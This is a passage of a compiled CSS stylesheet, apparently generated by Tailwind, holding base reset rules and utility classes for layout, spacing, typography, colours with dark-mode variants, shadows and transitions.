                    --color-green-1000: var(--color-green-1000)
                }
            }

            @layer base {

                *,
                ::backdrop,
                ::file-selector-button,
                :after,
                :before {
                    box-sizing: border-box;
                    margin: 0;
                    padding: 0;
                    border: 0 solid
                }

                :host,
                html {
                    line-height: 1.5;
                    -webkit-text-size-adjust: 100%;
                    tab-size: 4;
                    font-family: var(--default-font-family, ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji");
                    font-feature-settings: var(--default-font-feature-settings, normal);
                    font-variation-settings: var(--default-font-variation-settings, normal);
                    -webkit-tap-highlight-color: transparent
                }

                hr {
                    height: 0;
                    color: inherit;
                    border-top-width: 1px
                }

                abbr:where([title]) {
                    -webkit-text-decoration: underline dotted;
                    text-decoration: underline dotted
                }

                h1,
                h2,
                h3,
                h4,
                h5,
                h6 {
                    font-size: inherit;
                    font-weight: inherit
                }

                a {
                    color: inherit;
                    -webkit-text-decoration: inherit;
                    text-decoration: inherit
                }

                b,
                strong {
                    font-weight: bolder
                }

                code,
                kbd,
                pre,
                samp {
                    font-family: var(--default-mono-font-family, ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace);
                    font-feature-settings: var(--default-mono-font-feature-settings, normal);
                    font-variation-settings: var(--default-mono-font-variation-settings, normal);
                    font-size: 1em
                }

                small {
                    font-size: 80%
                }

                sub,
                sup {
                    font-size: 75%;
                    line-height: 0;
                    position: relative;
                    vertical-align: baseline
                }

                sub {
                    bottom: -.25em
                }

                sup {
                    top: -.5em
                }

                table {
                    text-indent: 0;
                    border-color: inherit;
                    border-collapse: collapse
                }

                :-moz-focusring {
                    outline: auto
                }

                progress {
                    vertical-align: baseline
                }

                summary {
                    display: list-item
                }

                menu,
                ol,
                ul {
                    list-style: none
                }

                audio,
                canvas,
                embed,
                iframe,
                img,
                object,
                svg,
                video {
                    display: block;
                    vertical-align: middle
                }

                img,
                video {
                    max-width: 100%;
                    height: auto
                }

                ::file-selector-button,
                button,
                input,
                optgroup,
                select,
                textarea {
                    font: inherit;
                    font-feature-settings: inherit;
                    font-variation-settings: inherit;
                    letter-spacing: inherit;
                    color: inherit;
                    border-radius: 0;
                    background-color: transparent;
                    opacity: 1
                }

                :where(select:is([multiple], [size])) optgroup {
                    font-weight: bolder
                }

                :where(select:is([multiple], [size])) optgroup option {
                    padding-inline-start: 20px
                }

                ::file-selector-button {
                    margin-inline-end: 4px
                }

                ::placeholder {
                    opacity: 1
                }

                @supports (not (-webkit-appearance:-apple-pay-button)) or (contain-intrinsic-size:1px) {
                    ::placeholder {
                        color: currentcolor;

                        @supports (color:color-mix(in lab, red, red)) {
                            color: color-mix(in oklab, currentcolor 50%, transparent)
                        }
                    }
                }

                textarea {
                    resize: vertical
                }

                ::-webkit-search-decoration {
                    -webkit-appearance: none
                }

                ::-webkit-date-and-time-value {
                    min-height: 1lh;
                    text-align: inherit
                }

                ::-webkit-datetime-edit {
                    display: inline-flex
                }

                ::-webkit-datetime-edit-fields-wrapper {
                    padding: 0
                }

                ::-webkit-datetime-edit,
                ::-webkit-datetime-edit-day-field,
                ::-webkit-datetime-edit-hour-field,
                ::-webkit-datetime-edit-meridiem-field,
                ::-webkit-datetime-edit-millisecond-field,
                ::-webkit-datetime-edit-minute-field,
                ::-webkit-datetime-edit-month-field,
                ::-webkit-datetime-edit-second-field,
                ::-webkit-datetime-edit-year-field {
                    padding-block: 0
                }

                ::-webkit-calendar-picker-indicator {
                    line-height: 1
                }

                :-moz-ui-invalid {
                    box-shadow: none
                }

                ::file-selector-button,
                button,
                input:where([type=button], [type=reset], [type=submit]) {
                    appearance: button
                }

                ::-webkit-inner-spin-button,
                ::-webkit-outer-spin-button {
                    height: auto
                }

                [hidden]:where(:not([hidden=until-found])) {
                    display: none !important
                }
            }

            @layer utilities {
                .\@container {
                    container-type: inline-size
                }

                .pointer-events-none {
                    pointer-events: none
                }

                .collapse {
                    visibility: collapse
                }

                .invisible {
                    visibility: hidden
                }

                .visible {
                    visibility: visible
                }

                .sr-only {
                    width: 1px;
                    height: 1px;
                    padding: 0;
                    margin: -1px;
                    overflow: hidden;
                    clip-path: inset(50%);
                    white-space: nowrap;
                    border-width: 0
                }

                .absolute,
                .sr-only {
                    position: absolute
                }

                .fixed {
                    position: fixed
                }

                .relative {
                    position: relative
                }

                .static {
                    position: static
                }

                .sticky {
                    position: sticky
                }

                .inset-0 {
                    inset: calc(var(--spacing)*0)
                }

                .inset-x-0 {
                    inset-inline: calc(var(--spacing)*0)
                }

                .-start {
                    inset-inline-start: calc(var(--spacing)*-1)
                }

                .start {
                    inset-inline-start: var(--spacing)
                }

                .-end {
                    inset-inline-end: calc(var(--spacing)*-1)
                }

                .end {
                    inset-inline-end: var(--spacing)
                }

                .top-0 {
                    top: calc(var(--spacing)*0)
                }

                .top-1\/2 {
                    top: 50%
                }

                .top-3 {
                    top: calc(var(--spacing)*3)
                }

                .top-\[80\%\] {
                    top: 80%
                }

                .right-0 {
                    right: calc(var(--spacing)*0)
                }

                .right-3 {
                    right: calc(var(--spacing)*3)
                }

                .bottom-2 {
                    bottom: calc(var(--spacing)*2)
                }

                .left-0 {
                    left: calc(var(--spacing)*0)
                }

                .left-1\/2 {
                    left: 50%
                }

                .isolate {
                    isolation: isolate
                }

                .z-10 {
                    z-index: 10
                }

                .z-50 {
                    z-index: 50
                }

                .col-3 {
                    grid-column: 3
                }

                .col-4 {
                    grid-column: 4
                }

                .col-5 {
                    grid-column: 5
                }

                .col-6 {
                    grid-column: 6
                }

                .col-7 {
                    grid-column: 7
                }

                .col-8 {
                    grid-column: 8
                }

                .col-10 {
                    grid-column: 10
                }

                .col-12 {
                    grid-column: 12
                }

                .col-auto {
                    grid-column: auto
                }

                .container {
                    width: 100%;

                    @media (width>=320px) {
                        max-width: 320px
                    }

                    @media (width>=768px) {
                        max-width: 768px
                    }

                    @media (width>=1200px) {
                        max-width: 1200px
                    }
                }

                .m-0 {
                    margin: calc(var(--spacing)*0)
                }

                .m-2 {
                    margin: calc(var(--spacing)*2)
                }

                .container {
                    margin-inline: auto;

                    @media (width>=768px) {
                        max-width: var(--container-md)
                    }

                    @media (width>=1200px) {
                        max-width: var(--container-lg)
                    }
                }

                .mx-1 {
                    margin-inline: calc(var(--spacing)*1)
                }

                .mx-auto {
                    margin-inline: auto
                }

                .my-4 {
                    margin-block: calc(var(--spacing)*4)
                }

                .-mt-1 {
                    margin-top: calc(var(--spacing)*-1)
                }

                .mt-0\.5 {
                    margin-top: calc(var(--spacing)*.5)
                }

                .mt-2 {
                    margin-top: calc(var(--spacing)*2)
                }

                .mt-3 {
                    margin-top: calc(var(--spacing)*3)
                }

                .mt-4 {
                    margin-top: calc(var(--spacing)*4)
                }

                .mt-6 {
                    margin-top: calc(var(--spacing)*6)
                }

                .mt-8 {
                    margin-top: calc(var(--spacing)*8)
                }

                .mt-18 {
                    margin-top: calc(var(--spacing)*18)
                }

                .mt-33 {
                    margin-top: calc(var(--spacing)*33)
                }

                .mt-\[3px\] {
                    margin-top: 3px
                }

                .-mr-1\.5 {
                    margin-right: calc(var(--spacing)*-1.5)
                }

                .mr-1 {
                    margin-right: calc(var(--spacing)*1)
                }

                .mr-1\.5 {
                    margin-right: calc(var(--spacing)*1.5)
                }

                .mr-2 {
                    margin-right: calc(var(--spacing)*2)
                }

                .mr-auto {
                    margin-right: auto
                }

                .mb-0 {
                    margin-bottom: calc(var(--spacing)*0)
                }

                .mb-1 {
                    margin-bottom: calc(var(--spacing)*1)
                }

                .mb-2 {
                    margin-bottom: calc(var(--spacing)*2)
                }

                .mb-4 {
                    margin-bottom: calc(var(--spacing)*4)
                }

                .mb-6 {
                    margin-bottom: calc(var(--spacing)*6)
                }

                .mb-8 {
                    margin-bottom: calc(var(--spacing)*8)
                }

                .mb-15 {
                    margin-bottom: calc(var(--spacing)*15)
                }

                .mb-20 {
                    margin-bottom: calc(var(--spacing)*20)
                }

                .ml-4 {
                    margin-left: calc(var(--spacing)*4)
                }

                .ml-auto {
                    margin-left: auto
                }

                .line-clamp-1 {
                    -webkit-line-clamp: 1
                }

                .line-clamp-1,
                .line-clamp-2 {
                    overflow: hidden;
                    display: -webkit-box;
                    -webkit-box-orient: vertical
                }

                .line-clamp-2 {
                    -webkit-line-clamp: 2
                }

                .block {
                    display: block
                }

                .contents {
                    display: contents
                }

                .flex {
                    display: flex
                }

                .grid {
                    display: grid
                }

                .hidden {
                    display: none
                }

                .inline {
                    display: inline
                }

                .inline-block {
                    display: inline-block
                }

                .table {
                    display: table
                }

                .table-cell {
                    display: table-cell
                }

                .table-row {
                    display: table-row
                }

                .table-row-group {
                    display: table-row-group
                }

                .size-10 {
                    width: calc(var(--spacing)*10);
                    height: calc(var(--spacing)*10)
                }

                .size-\[180px\] {
                    width: 180px;
                    height: 180px
                }

                .h-0 {
                    height: calc(var(--spacing)*0)
                }

                .h-1 {
                    height: calc(var(--spacing)*1)
                }

                .h-4 {
                    height: calc(var(--spacing)*4)
                }

                .h-6 {
                    height: calc(var(--spacing)*6)
                }

                .h-7 {
                    height: calc(var(--spacing)*7)
                }

                .h-8 {
                    height: calc(var(--spacing)*8)
                }

                .h-10 {
                    height: calc(var(--spacing)*10)
                }

                .h-14 {
                    height: calc(var(--spacing)*14)
                }

                .h-\[22px\] {
                    height: 22px
                }

                .h-\[23px\] {
                    height: 23px
                }

                .h-\[56px\] {
                    height: 56px
                }

                .h-\[80px\] {
                    height: 80px
                }

                .h-\[90vh\] {
                    height: 90vh
                }

                .h-\[91px\] {
                    height: 91px
                }

                .h-\[140px\] {
                    height: 140px
                }

                .h-\[180px\] {
                    height: 180px
                }

                .h-full {
                    height: 100%
                }

                .max-h-75 {
                    max-height: calc(var(--spacing)*75)
                }

                .max-h-\[400px\] {
                    max-height: 400px
                }

                .max-h-full {
                    max-height: 100%
                }

                .min-h-0 {
                    min-height: calc(var(--spacing)*0)
                }

                .w-1 {
                    width: calc(var(--spacing)*1)
                }

                .w-1\/2 {
                    width: 50%
                }

                .w-4 {
                    width: calc(var(--spacing)*4)
                }

                .w-6 {
                    width: calc(var(--spacing)*6)
                }

                .w-7 {
                    width: calc(var(--spacing)*7)
                }

                .w-8 {
                    width: calc(var(--spacing)*8)
                }

                .w-10 {
                    width: calc(var(--spacing)*10)
                }

                .w-14 {
                    width: calc(var(--spacing)*14)
                }

                .w-44 {
                    width: calc(var(--spacing)*44)
                }

                .w-47\.25 {
                    width: calc(var(--spacing)*47.25)
                }

                .w-90 {
                    width: calc(var(--spacing)*90)
                }

                .w-240 {
                    width: calc(var(--spacing)*240)
                }

                .w-\[22px\] {
                    width: 22px
                }

                .w-\[56px\] {
                    width: 56px
                }

                .w-\[68px\] {
                    width: 68px
                }

                .w-\[80px\] {
                    width: 80px
                }

                .w-\[140px\] {
                    width: 140px
                }

                .w-\[180px\] {
                    width: 180px
                }

                .w-\[218px\] {
                    width: 218px
                }

                .w-\[245px\] {
                    width: 245px
                }

                .w-\[440px\] {
                    width: 440px
                }

                .w-\[460px\] {
                    width: 460px
                }

                .w-\[497px\] {
                    width: 497px
                }

                .w-auto {
                    width: auto
                }

                .w-full {
                    width: 100%
                }

                .max-w-\[220px\] {
                    max-width: 220px
                }

                .max-w-\[308px\] {
                    max-width: 308px
                }

                .max-w-\[454px\] {
                    max-width: 454px
                }

                .max-w-\[497px\] {
                    max-width: 497px
                }

                .max-w-\[696px\] {
                    max-width: 696px
                }

                .max-w-\[794px\] {
                    max-width: 794px
                }

                .max-w-full {
                    max-width: 100%
                }

                .min-w-0 {
                    min-width: calc(var(--spacing)*0)
                }

                .min-w-\[120px\] {
                    min-width: 120px
                }

                .min-w-\[497px\] {
                    min-width: 497px
                }

                .flex-1 {
                    flex: 1
                }

                .flex-none {
                    flex: none
                }

                .flex-shrink {
                    flex-shrink: 1
                }

                .shrink-0 {
                    flex-shrink: 0
                }

                .flex-grow,
                .grow {
                    flex-grow: 1
                }

                .border-collapse {
                    border-collapse: collapse
                }

                .-translate-x-1\/2 {
                    --tw-translate-x: -50%
                }

                .-translate-x-1\/2,
                .-translate-y-1\/2 {
                    translate: var(--tw-translate-x) var(--tw-translate-y)
                }

                .-translate-y-1\/2 {
                    --tw-translate-y: -50%
                }

                .transform {
                    transform: var(--tw-rotate-x, ) var(--tw-rotate-y, ) var(--tw-rotate-z, ) var(--tw-skew-x, ) var(--tw-skew-y, )
                }

                .cursor-grabbing {
                    cursor: grabbing
                }

                .cursor-not-allowed {
                    cursor: not-allowed
                }

                .cursor-pointer {
                    cursor: pointer
                }

                .resize {
                    resize: both
                }

                .list-outside {
                    list-style-position: outside
                }

                .list-disc {
                    list-style-type: disc
                }

                .list-none {
                    list-style-type: none
                }

                .flex-col {
                    flex-direction: column
                }

                .flex-row {
                    flex-direction: row
                }

                .flex-nowrap {
                    flex-wrap: nowrap
                }

                .flex-wrap {
                    flex-wrap: wrap
                }

                .items-center {
                    align-items: center
                }

                .justify-between {
                    justify-content: space-between
                }

                .justify-center {
                    justify-content: center
                }

                .justify-end {
                    justify-content: flex-end
                }

                .gap-0\.5 {
                    gap: calc(var(--spacing)*.5)
                }

                .gap-1 {
                    gap: calc(var(--spacing)*1)
                }

                .gap-2 {
                    gap: calc(var(--spacing)*2)
                }

                .gap-3 {
                    gap: calc(var(--spacing)*3)
                }

                .gap-4 {
                    gap: calc(var(--spacing)*4)
                }

                .gap-6 {
                    gap: calc(var(--spacing)*6)
                }

                .gap-10 {
                    gap: calc(var(--spacing)*10)
                }

                .gap-12 {
                    gap: calc(var(--spacing)*12)
                }

                .gap-\[2px\] {
                    gap: 2px
                }

                .self-center {
                    align-self: center
                }

                .self-end {
                    align-self: flex-end
                }

                .self-start {
                    align-self: flex-start
                }

                .self-stretch {
                    align-self: stretch
                }

                .justify-self-center {
                    justify-self: center
                }

                .truncate {
                    overflow: hidden;
                    text-overflow: ellipsis;
                    white-space: nowrap
                }

                .overflow-auto {
                    overflow: auto
                }

                .overflow-hidden {
                    overflow: hidden
                }

                .overflow-visible {
                    overflow: visible
                }

                .overflow-x-auto {
                    overflow-x: auto
                }

                .overflow-x-scroll {
                    overflow-x: scroll
                }

                .overflow-y-auto {
                    overflow-y: auto
                }

                .overflow-y-hidden {
                    overflow-y: hidden
                }

                .rounded-full {
                    border-radius: var(--borderRadius-full)
                }

                .rounded-lg {
                    border-radius: var(--borderRadius-lg)
                }

                .rounded-md {
                    border-radius: var(--borderRadius-md)
                }

                .rounded-sm {
                    border-radius: var(--borderRadius-sm)
                }

                .rounded-xs {
                    border-radius: var(--borderRadius-xs)
                }

                .border {
                    border-style: var(--tw-border-style);
                    border-width: 1px
                }

                .border-0 {
                    border-style: var(--tw-border-style);
                    border-width: 0
                }

                .border-2 {
                    border-style: var(--tw-border-style);
                    border-width: 2px
                }

                .border-t {
                    border-top-style: var(--tw-border-style);
                    border-top-width: 1px
                }

                .border-b {
                    border-bottom-style: var(--tw-border-style);
                    border-bottom-width: 1px
                }

                .border-b-2 {
                    border-bottom-style: var(--tw-border-style);
                    border-bottom-width: 2px
                }

                .border-l {
                    border-left-style: var(--tw-border-style);
                    border-left-width: 1px
                }

                .border-solid {
                    --tw-border-style: solid;
                    border-style: solid
                }

                .border-accent {
                    border-color: var(--color-blue-600);

                    .dark & {
                        border-color: var(--color-blue-600)
                    }
                }

                .border-input {
                    border-color: var(--color-neutral-500);

                    .dark & {
                        border-color: var(--color-neutral-600)
                    }
                }

                .border-primary {
                    border-color: var(--color-neutral-300);

                    .dark & {
                        border-color: var(--color-neutral-700)
                    }
                }

                .border-secondary {
                    border-color: var(--color-neutral-200);

                    .dark & {
                        border-color: var(--color-neutral-800)
                    }
                }

                .bg-accent-subtle {
                    background-color: var(--color-blue-100);

                    .dark & {
                        background-color: var(--color-blue-950)
                    }
                }

                .bg-critical-subtle {
                    background-color: var(--color-red-100);

                    .dark & {
                        background-color: var(--color-red-950)
                    }
                }

                .bg-primary {
                    background-color: var(--color-neutral-100);

                    .dark & {
                        background-color: var(--color-neutral-1000)
                    }
                }

                .bg-secondary {
                    background-color: var(--color-neutral-0);

                    .dark & {
                        background-color: var(--color-neutral-950)
                    }
                }

                .bg-tertiary {
                    background-color: var(--color-neutral-150);

                    .dark & {
                        background-color: var(--color-neutral-900)
                    }
                }

                .bg-neutral-600 {
                    background-color: var(--color-neutral-600)
                }

                .bg-neutral-900 {
                    background-color: var(--color-neutral-900)
                }

                .bg-transparent {
                    background-color: transparent
                }

                .fill-current {
                    fill: currentcolor
                }

                .p-0 {
                    padding: calc(var(--spacing)*0)
                }

                .p-1 {
                    padding: calc(var(--spacing)*1)
                }

                .p-2 {
                    padding: calc(var(--spacing)*2)
                }

                .p-3 {
                    padding: calc(var(--spacing)*3)
                }

                .p-4 {
                    padding: calc(var(--spacing)*4)
                }

                .p-5 {
                    padding: calc(var(--spacing)*5)
                }

                .p-6 {
                    padding: calc(var(--spacing)*6)
                }

                .p-\[1px\] {
                    padding: 1px
                }

                .px-2 {
                    padding-inline: calc(var(--spacing)*2)
                }

                .px-3 {
                    padding-inline: calc(var(--spacing)*3)
                }

                .px-4 {
                    padding-inline: calc(var(--spacing)*4)
                }

                .px-5 {
                    padding-inline: calc(var(--spacing)*5)
                }

                .px-7 {
                    padding-inline: calc(var(--spacing)*7)
                }

                .px-8 {
                    padding-inline: calc(var(--spacing)*8)
                }

                .px-10 {
                    padding-inline: calc(var(--spacing)*10)
                }

                .px-24 {
                    padding-inline: calc(var(--spacing)*24)
                }

                .px-\[13px\] {
                    padding-inline: 13px
                }

                .py-0 {
                    padding-block: calc(var(--spacing)*0)
                }

                .py-1 {
                    padding-block: calc(var(--spacing)*1)
                }

                .py-2 {
                    padding-block: calc(var(--spacing)*2)
                }

                .py-2\.5 {
                    padding-block: calc(var(--spacing)*2.5)
                }

                .py-3 {
                    padding-block: calc(var(--spacing)*3)
                }

                .py-3\.5 {
                    padding-block: calc(var(--spacing)*3.5)
                }

                .py-4 {
                    padding-block: calc(var(--spacing)*4)
                }

                .py-6 {
                    padding-block: calc(var(--spacing)*6)
                }

                .py-8 {
                    padding-block: calc(var(--spacing)*8)
                }

                .py-9 {
                    padding-block: calc(var(--spacing)*9)
                }

                .py-10 {
                    padding-block: calc(var(--spacing)*10)
                }

                .pt-1 {
                    padding-top: calc(var(--spacing)*1)
                }

                .pt-2 {
                    padding-top: calc(var(--spacing)*2)
                }

                .pt-3 {
                    padding-top: calc(var(--spacing)*3)
                }

                .pt-6 {
                    padding-top: calc(var(--spacing)*6)
                }

                .pt-10 {
                    padding-top: calc(var(--spacing)*10)
                }

                .pt-12 {
                    padding-top: calc(var(--spacing)*12)
                }

                .pt-15 {
                    padding-top: calc(var(--spacing)*15)
                }

                .pr-1\.5 {
                    padding-right: calc(var(--spacing)*1.5)
                }

                .pr-2 {
                    padding-right: calc(var(--spacing)*2)
                }

                .pr-3 {
                    padding-right: calc(var(--spacing)*3)
                }

                .pr-4 {
                    padding-right: calc(var(--spacing)*4)
                }

                .pr-14 {
                    padding-right: calc(var(--spacing)*14)
                }

                .pr-40 {
                    padding-right: calc(var(--spacing)*40)
                }

                .pb-2 {
                    padding-bottom: calc(var(--spacing)*2)
                }

                .pb-3 {
                    padding-bottom: calc(var(--spacing)*3)
                }

                .pb-4 {
                    padding-bottom: calc(var(--spacing)*4)
                }

                .pb-5 {
                    padding-bottom: calc(var(--spacing)*5)
                }

                .pl-4 {
                    padding-left: calc(var(--spacing)*4)
                }

                .pl-5 {
                    padding-left: calc(var(--spacing)*5)
                }

                .pl-6 {
                    padding-left: calc(var(--spacing)*6)
                }

                .text-center {
                    text-align: center
                }

                .text-left {
                    text-align: left
                }

                .align-bottom {
                    vertical-align: bottom
                }

                .align-middle {
                    vertical-align: middle
                }

                .body {
                    font-weight: var(--fontWeight-normal)
                }

                .body,
                .body-md-bold {
                    font-family: var(--font-body);
                    font-size: var(--fontSize-md);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 22px
                }

                .body-md-bold {
                    font-weight: var(--fontWeight-bold)
                }

                .body-sm-medium {
                    font-family: var(--font-body);
                    font-weight: var(--fontWeight-medium);
                    font-size: var(--fontSize-sm);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 20px
                }

                .caption {
                    font-weight: var(--fontWeight-normal)
                }

                .caption,
                .caption-medium {
                    font-family: var(--font-body);
                    font-size: var(--fontSize-xs);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 18px
                }

                .caption-medium {
                    font-weight: var(--fontWeight-medium)
                }

                .display {
                    font-family: var(--font-heading);
                    font-weight: var(--fontWeight-bold);
                    font-size: var(--fontSize-5xl);
                    letter-spacing: var(--letterSpacing-sm);
                    line-height: 36px
                }

                .display\! {
                    font-family: var(--font-heading) !important;
                    font-weight: var(--fontWeight-bold) !important;
                    font-size: var(--fontSize-5xl) !important;
                    letter-spacing: var(--letterSpacing-sm) !important;
                    line-height: 36px !important
                }

                .heading {
                    font-size: var(--fontSize-3xl);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 32px
                }

                .heading,
                .heading-2xl {
                    font-family: var(--font-heading);
                    font-weight: var(--fontWeight-bold)
                }

                .heading-2xl {
                    font-size: var(--fontSize-7xl);
                    letter-spacing: var(--letterSpacing-sm);
                    line-height: 48px
                }

                .heading-md {
                    font-size: var(--fontSize-4xl);
                    line-height: 34px
                }

                .heading-md,
                .heading-sm {
                    font-family: var(--font-heading);
                    font-weight: var(--fontWeight-bold);
                    letter-spacing: var(--letterSpacing-md)
                }

                .heading-sm {
                    font-size: var(--fontSize-2xl);
                    line-height: 30px
                }

                .heading-xl {
                    font-family: var(--font-heading);
                    font-weight: var(--fontWeight-bold);
                    font-size: var(--fontSize-6xl);
                    letter-spacing: var(--letterSpacing-sm);
                    line-height: 40px
                }

                .subBody {
                    font-weight: var(--fontWeight-normal);
                    font-size: var(--fontSize-sm);
                    line-height: 20px
                }

                .subBody,
                .subHeading {
                    font-family: var(--font-body);
                    letter-spacing: var(--letterSpacing-md)
                }

                .subHeading {
                    font-weight: var(--fontWeight-medium);
                    font-size: var(--fontSize-md);
                    line-height: 22px
                }

                .font-mono {
                    font-family: var(--font-mono)
                }

                .text-3xl {
                    font-size: var(--text-3xl);
                    line-height: var(--tw-leading, var(--text-3xl--line-height))
                }

                .text-sm {
                    font-size: var(--text-sm);
                    line-height: var(--tw-leading, var(--text-sm--line-height))
                }

                .leading-tight {
                    --tw-leading: var(--leading-tight);
                    line-height: var(--leading-tight)
                }

                .font-light {
                    --tw-font-weight: var(--font-weight-light);
                    font-weight: var(--font-weight-light)
                }

                .font-normal {
                    --tw-font-weight: var(--font-weight-normal);
                    font-weight: var(--font-weight-normal)
                }

                .font-semibold {
                    --tw-font-weight: var(--font-weight-semibold);
                    font-weight: var(--font-weight-semibold)
                }

                .whitespace-pre-line {
                    white-space: pre-line
                }

                .text-accent {
                    color: var(--color-blue-600);

                    .dark & {
                        color: var(--color-blue-500)
                    }
                }

                .text-critical {
                    color: var(--color-red-700);

                    .dark & {
                        color: var(--color-red-400)
                    }
                }

                .text-disabled {
                    color: var(--color-neutral-400);

                    .dark & {
                        color: var(--color-neutral-700)
                    }
                }

                .text-primary {
                    color: var(--color-neutral-900);

                    .dark & {
                        color: var(--color-neutral-0)
                    }
                }

                .text-secondary {
                    color: var(--color-neutral-600);

                    .dark & {
                        color: var(--color-neutral-500)
                    }
                }

                .text-success {
                    color: var(--color-green-700);

                    .dark & {
                        color: var(--color-green-400)
                    }
                }

                .capitalize {
                    text-transform: capitalize
                }

                .lowercase {
                    text-transform: lowercase
                }

                .uppercase {
                    text-transform: uppercase
                }

                .italic {
                    font-style: italic
                }

                .line-through {
                    text-decoration-line: line-through
                }

                .overline {
                    text-decoration-line: overline
                }

                .underline {
                    text-decoration-line: underline
                }

                .antialiased {
                    -webkit-font-smoothing: antialiased;
                    -moz-osx-font-smoothing: grayscale
                }

                .opacity-0 {
                    opacity: 0
                }

                .shadow-focus-inset {
                    --tw-shadow: inset 0px 0px 0px 2px var(--tw-shadow-color, var(--color-blue-600)), inset 0px 0px 0 4px var(--tw-shadow-color, var(--color-neutral-0))
                }

                .shadow-focus-inset,
                .shadow-lg {
                    box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                }

                .shadow-lg {
                    --tw-shadow: 0 4px 8px 0 var(--tw-shadow-color, rgba(0, 0, 0, .16))
                }

                .shadow-bevel {
                    box-shadow: 0 2px 8px 0 rgba(0, 0, 0, .04), inset 0 .5px 0 0 hsla(0, 0%, 100%, 0);

                    .dark & {
                        box-shadow: 0 2px 8px 0 transparent, inset 0 .5px 0 0 hsla(0, 0%, 100%, .16)
                    }
                }

                .outline-hidden {
                    --tw-outline-style: none;
                    outline-style: none;

                    @media (forced-colors:active) {
                        outline: 2px solid transparent;
                        outline-offset: 2px
                    }
                }

                .outline {
                    outline-style: var(--tw-outline-style);
                    outline-width: 1px
                }

                .blur {
                    --tw-blur: blur(8px)
                }

                .blur,
                .drop-shadow {
                    filter: var(--tw-blur, ) var(--tw-brightness, ) var(--tw-contrast, ) var(--tw-grayscale, ) var(--tw-hue-rotate, ) var(--tw-invert, ) var(--tw-saturate, ) var(--tw-sepia, ) var(--tw-drop-shadow, )
                }

                .drop-shadow {
                    --tw-drop-shadow-size: drop-shadow(0 1px 2px var(--tw-drop-shadow-color, rgba(0, 0, 0, .1))) drop-shadow(0 1px 1px var(--tw-drop-shadow-color, rgba(0, 0, 0, .06)));
                    --tw-drop-shadow: drop-shadow(0 1px 2px rgba(0, 0, 0, .1)) drop-shadow(0 1px 1px rgba(0, 0, 0, .06))
                }

                .invert {
                    --tw-invert: invert(100%)
                }

                .filter,
                .invert {
                    filter: var(--tw-blur, ) var(--tw-brightness, ) var(--tw-contrast, ) var(--tw-grayscale, ) var(--tw-hue-rotate, ) var(--tw-invert, ) var(--tw-saturate, ) var(--tw-sepia, ) var(--tw-drop-shadow, )
                }

                .backdrop-filter {
                    -webkit-backdrop-filter: var(--tw-backdrop-blur, ) var(--tw-backdrop-brightness, ) var(--tw-backdrop-contrast, ) var(--tw-backdrop-grayscale, ) var(--tw-backdrop-hue-rotate, ) var(--tw-backdrop-invert, ) var(--tw-backdrop-opacity, ) var(--tw-backdrop-saturate, ) var(--tw-backdrop-sepia, );
                    backdrop-filter: var(--tw-backdrop-blur, ) var(--tw-backdrop-brightness, ) var(--tw-backdrop-contrast, ) var(--tw-backdrop-grayscale, ) var(--tw-backdrop-hue-rotate, ) var(--tw-backdrop-invert, ) var(--tw-backdrop-opacity, ) var(--tw-backdrop-saturate, ) var(--tw-backdrop-sepia, )
                }

                .transition {
                    transition-property: color, background-color, border-color, outline-color, text-decoration-color, fill, stroke, --tw-gradient-from, --tw-gradient-via, --tw-gradient-to, opacity, box-shadow, transform, translate, scale, rotate, filter, -webkit-backdrop-filter, backdrop-filter, display, content-visibility, overlay, pointer-events;
                    transition-timing-function: var(--tw-ease, var(--default-transition-timing-function));
                    transition-duration: var(--tw-duration, var(--default-transition-duration))
                }

                .transition-colors {
                    transition-property: color, background-color, border-color, outline-color, text-decoration-color, fill, stroke, --tw-gradient-from, --tw-gradient-via, --tw-gradient-to;
                    transition-timing-function: var(--tw-ease, var(--default-transition-timing-function));
                    transition-duration: var(--tw-duration, var(--default-transition-duration))
                }

                .transition-opacity {
                    transition-property: opacity;
                    transition-timing-function: var(--tw-ease, var(--default-transition-timing-function));
                    transition-duration: var(--tw-duration, var(--default-transition-duration))
                }

                .duration-500 {
                    --tw-duration: 500ms;
                    transition-duration: .5s
                }

                .ease-in {
                    --tw-ease: cubic-bezier(0.4, 0, 1, 1);
                    transition-timing-function: cubic-bezier(.4, 0, 1, 1)
                }

                .ease-in-out {
                    --tw-ease: cubic-bezier(0.4, 0, 0.2, 1);
                    transition-timing-function: cubic-bezier(.4, 0, .2, 1)
                }

                .ease-linear {
                    --tw-ease: linear;
                    transition-timing-function: linear
                }

                .ease-out {
                    --tw-ease: cubic-bezier(0, 0, 0.2, 1);
                    transition-timing-function: cubic-bezier(0, 0, .2, 1)
                }

                .outline-none {
                    --tw-outline-style: none;
                    outline-style: none
                }

                .select-none {
                    -webkit-user-select: none;
                    user-select: none
                }

                .marker\:text-primary {
                    & ::marker {
                        color: var(--color-neutral-900);

                        .dark & {
                            color: var(--color-neutral-0)
                        }
                    }

                    &::marker {
                        color: var(--color-neutral-900);

                        .dark & {
                            color: var(--color-neutral-0)
                        }
                    }

                    & ::-webkit-details-marker {
                        color: var(--color-neutral-900);

                        .dark & {
                            color: var(--color-neutral-0)
                        }
                    }

                    &::-webkit-details-marker {
                        color: var(--color-neutral-900);

                        .dark & {
                            color: var(--color-neutral-0)
                        }
                    }
                }

                .placeholder\:text-placeholder {
                    &::placeholder {
                        color: var(--color-neutral-600);

                        .dark & {
                            color: var(--color-neutral-400)
                        }
                    }
                }

                .first\:start {
                    &:first-child {
                        inset-inline-start: var(--spacing)
                    }
                }

                .first\:end {
                    &:first-child {
                        inset-inline-end: var(--spacing)
                    }
                }

                .hover\:border-accent {
                    &:hover {
                        @media (hover:hover) {
                            border-color: var(--color-blue-600);

                            .dark & {
                                border-color: var(--color-blue-600)
                            }
                        }
                    }
                }

                .hover\:bg-primary-active {
                    &:hover {
                        @media (hover:hover) {
                            background-color: var(--color-neutral-150);

                            .dark & {
                                background-color: var(--color-neutral-950)
                            }
                        }
                    }
                }

                .hover\:bg-tertiary {
                    &:hover {
                        @media (hover:hover) {
                            background-color: var(--color-neutral-150);

                            .dark & {
                                background-color: var(--color-neutral-900)
                            }
                        }
